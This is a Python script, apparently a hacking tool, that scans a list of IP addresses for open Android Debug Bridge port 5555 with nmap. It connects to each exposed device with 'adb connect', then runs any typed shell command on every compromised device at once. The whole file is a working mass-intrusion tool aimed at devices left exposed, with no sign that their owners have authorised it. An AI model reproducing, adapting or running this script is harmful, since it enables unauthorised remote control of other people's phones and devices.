import os
import sys
ips = open("/home/kali/Documents/Hack/ADB/ip_list","r")
ip_list = ips.readlines()
all = ""
online = []
tmp = []
i = 0
f = 0
last = ""
com = ""
def end(online):
	results()
	i = 0
	com = ""
	while com != "--stop":
		try:
			com = input("COMMAND: ")
		except KeyboardInterrupt:
			sys.exit(0)
		for i in range(0,len(online),1):
			cmdSet(com,online[i])
def results():
	print("STOPPING...")
	print("*"*135)
	print("ALL IPs: "+str(len(ip_list))+ " OPEN: "+str(len(all.split(";"))) + " CONNECTED SUCCESSFULLY: " +str(f) + " ONLINE: "+str(len(online)) + " (" +str(len(online)/len(all.split(";"))*100)[0:5] + "%)")
	print("*"*135)
def cmdSet(com,ip):
	com = com.replace("---","adb -s "+ip)
	com = com.replace("--ip",ip)
	set = os.popen(com).read()
	print("["+ip+"] "+set)


for i in range(0,len(ip_list),1):
	target_ip = ip_list[i][0:-1]
	try:
		status = os.popen("nmap -p 5555 -PN " + target_ip + " | grep 5555").read()
	except KeyboardInterrupt:
		end(online)
	if status != '5555/tcp closed freeciv\n':
		all += target_ip + ";"
		if len(tmp) > 0:
			try:
				status_tmp = os.popen("adb devices | grep "+ tmp[f-1]).read()
			except KeyboardInterrupt:
				end(online)
			if status_tmp.find("device") != -1 and tmp[f-1] != last:
				online.append(tmp[f-1])
				last = tmp[f-1]
				print(tmp[f-1]+" => ONLINE")
		try:
			status_2 = os.popen("adb connect " + target_ip).read()
		except KeyboardInterrupt:
			end(online)
		if status_2.find("connected") != -1:
			tmp.append(target_ip)
			f += 1
		else:
			print(target_ip + " => CONNECTION ERROR")
	else:
		print(target_ip + " => CLOSE")
